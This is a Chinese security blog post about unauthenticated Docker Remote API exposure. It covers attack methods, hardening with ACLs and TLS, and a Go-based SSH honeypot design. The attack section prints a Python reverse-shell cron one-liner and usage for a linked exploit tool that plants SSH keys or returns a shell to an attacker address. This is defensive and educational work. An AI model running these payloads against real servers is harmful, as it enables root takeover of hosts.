```toml
title = "Docker Remote api在安全中的应用杂谈"
slug = "docker-remote-api-sec-misc"
desc = "docker-remote-api-sec-misc"
date = "2017-02-14 09:59:37"
update_date = "2017-02-14 09:59:37"
author = ""
thumb = ""
tags = ["tag"]
```

## 概述

部门每周三例行的技术分享投稿文章，首发在[小米安全中心](https://sec.xiaomi.com/article/22)

众所周知，Docker daemon默认是监听在unix socket上的，如unix:///var/run/docker.sock。
官方还提供一个Rustful api接口，允许通过TCP远程访问Docker，例如执行以下启动参数可以让docker监听在本地所有地址的2375端口上：

```bash
dockerd -H=0.0.0.0:2375 -H unix:///var/run/docker.sock
```

之后就可以用docker client或任意http客户端远程访问了：
```bash
$ curl http://10.10.10.10:2375/containers/json
[]

docker -H=tcp://10.10.10.10:2375 ps         
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
```
但是开启这种没有任何访问控制的Docker remote Api服务是非常危险的，攻击者发现后可以轻松地拿下整个服务器的权限。

## 攻击方法
Docker remote Api未授权访问的攻击原理与之前的Redis未授权访问漏洞大同小异，都是通过向运行该应用的服务器写文件，从而拿到服务器的权限，常见的利用方法如下：

1. 启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥`~/.ssh/id_rsa.pub`的内容写到入宿主机的`/root/.ssh/authorized_keys`文件中，之后就可以用root账户直接登录了
1. 启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到`/etc/crontab `中，攻击者会得到一个反弹的shell，其中反弹shell脚本的样例如下：

    ```bash
    echo -e "*/1 * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" >> /etc/crontab
    ```

第2种利用方法也可以挂载var/spool/cron/目录，将反弹shell的脚本写入到`/var/spool/cron/root（centos系统）`或`/var/spool/cron/crontabs/root(ubuntu系统)`

手工利用方法网上有很多，就不多说了，笔者直接给出一个go语言版的自动化利用工具，github地址为：[https://github.com/netxfly/docker-remote-api-exp](https://github.com/netxfly/docker-remote-api-exp)，使用方法如下：
```bash
$ ./remote_api_exp
Usage of ./remote_api_exp:
  -pubkey string
        id_rsa.pub file (default "/root/.ssh/id_rsa.pub")
  -reverse string
        reverse address, 6.6.6.6:8888
  -target string
        target ip, 1.1.1.1:2375
  -type string
        Type, such as check, root, shell (default "check")
  -version string
        Docker version:
        ---------------------------
        Docker version  API Version
        ---------------------------
        1.12.x          1.24
        1.11.x          1.23
        1.10.x          1.22
        1.9.x           1.21
        1.8.x           1.20
        1.7.x           1.19
        1.6.x           1.18

 (default "1.12")
```
### 参数说明：

1. ./remote_api_exp -type=check -target=ip:2375，获取服务器信息，如操作系统，机器名，remote api版本以及docker的安装位置等
1. ./remote_api_exp -type=root -target=ip:2375 -version=1.12.3，在/root/.ssh/authorized_keys写入攻击者的ssh公钥
1. ./remote_api_exp -type=shell -target=ip:2375 -version=1.12.3 -reverse=attackerIp:8888，给攻击者反弹一个shell

### 使用示例：

1. 以root账户登录
![](/media/image/2017/docker/root.png)

1. 获取一个反弹shell
![](/media/image/2017/docker/shell.png)

也许有运维同学觉得这是因为监听在了外网，所以攻击者才有机会攻击，如果我不监听在外网就没有安全隐患了，其实监听在内网也有以下安全隐患：

1. 外网攻击者可以通过WEB应用的SSRF漏洞，间接地攻击内网中的这些未授权的Docker remote api服务；
1. 方便已经攻入内网的攻击者扩大攻击范围；
1. 可能会被内部别有用心的人攻击，然后窃取敏感数据。

### 安全加固
在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：

1. 设置ACL，仅允许信任的来源IP连接；
1. 设置TLS认证，官方的文档为[Protect the Docker daemon socket](https://docs.docker.com/engine/security/https/)

客户端与服务器端通讯的证书生成后，可以通过以下命令启动docker daemon：
```bash
docker -d --tlsverify --tlscacert=ca.pem --tlscert=server-cert.pem --tlskey=server-key.pem -H=tcp://10.10.10.10:2375 -H unix:///var/run/docker.sock
```
客户端连接时需要设置以下环境变量
```bash
export DOCKER_TLS_VERIFY=1
export DOCKER_CERT_PATH=~/.docker
export DOCKER_HOST=tcp://10.10.10.10:2375
export DOCKER_API_VERSION=1.12
```

## 安全建设

以上咱们回顾了下docker remote api未授权访问认证的安全风险与利用方法，接下来咱们再切换到安全建设视角，用docker remote api构建一个可自动弹性伸缩的ssh蜜罐系统。

现在有不少安全从业者使用docker来做为蜜罐的沙箱了，但是存在一个普通的问题是：所有攻击者连接的都是同一个沙盒，放在外网的沙盒，经常会有多个攻击者同一时间段进入的可能，他们彼此之间可能会看到对方的行为从而识破蜜罐或者为我们单独分析日志造成干扰。

我们的愿景是让所有攻击者都能用上独立的沙盒。您来的时候自动为您开一个全新的沙盒，然后默默地记录下您的操作行为，您走后一段时间会自动销毁沙盒，把资源预留出来接待其他即将到来的黑客兄弟们。

<!--more-->

### 架构说明

![](/media/image/2017/docker/ssh-honeypot.png)

本套系统由Agent与Docker server组成，docker server需要开启docker remote api服务。

Agent可以部署在多个不同的节点上，通过检测本地的ssh log，确定是否有破解行为，如果有破解密码行为且超过3次，就会通过remote api接口在docker server中启动一个新的容器，然后将攻击者的流量转发到这个容器中。

Agent运行的效果如下所示：

![](/media/image/2017/docker/honeypot001.png)

然后在docker服务器可以通过ps命令看到刚才新创建的ssh蜜罐沙盒，如下所示：
![](/media/image/2017/docker/honeypot002.png)

### 具体实现

本系统由go语言实现，可以编译为独立的二进制文件，部署时直接将二进制文件上传到相应的服务器运行起来即可。

程序启动时会加载配置文件，配置文件选项如下图所示：

![](/media/image/2017/docker/app_ini.png)

配置参数说明：

1. DOCKER_HOST为Docker服务器的IP
1. DOCKER_API为Docker remote api的地址
1. API_VERSION为Docker remote api的版本号
1. DOCKER_CERT为Docker的客户端证书
1. INTERFACE为Agent部署蜜罐的网卡名称
1. WHITE_IPLIST为白名单，对这些来源IP不做防御
1. MAX_HONEYPOTS，表示Docker服务器中最大允许启动的容器数
1. sshd_log为Agent中本地openssh的log目录（默认为/var/log）

配置文件处理的代码如下所示：
![](/media/image/2017/docker/settings.png)

其中`Cache`是一个`map[string]*cache.Cache`，其中维护了每个容器的状态，比如攻击者的IP，攻击者次数，超时时间等信息。

主程序的代码如下：

```go
package main

import (
	"xsec-ssh-honeypot/settings"
	"xsec-ssh-honeypot/util"
)

func main() {
	go util.MonitorLog(settings.SshLog)

	util.Schedule(30)

} 
```
1. util.MonitorLog协程会监视Agent的ssh log，并检测是否有密码破解行为。
1. util.Schedule是个定期任务，这里是每30秒执行一次，每次主要完成以下任务：
    1. 刷新攻击流量转移策略
    1. 检查是否有超时的攻击者的容器，如果有就关闭掉并释放资源 

MonitorLog的代码如下所示：

![](/media/image/2017/docker/monitorlog.png)

如果有新的ssh log进来就会交给`CheckSSH(logContent *tail.Line)`函数处理，`CheckSSH(logContent *tail.Line)`配置文件处理的代码如下所示：

![](/media/image/2017/docker/sheckssh.png)

程序会在全局变量中settings.Cache中维护每个攻击者的来源IP，攻击次数与超时时间，如果攻击次数大于3则会为该攻击者新开一个容器，并将该攻击者的流量从Agent中直接转移到后端新开的ssh蜜罐中。

攻击者的流量转移到后端密码是通过iptables实现的，部分代码如下所示：

![](/media/image/2017/docker/iptables.png)



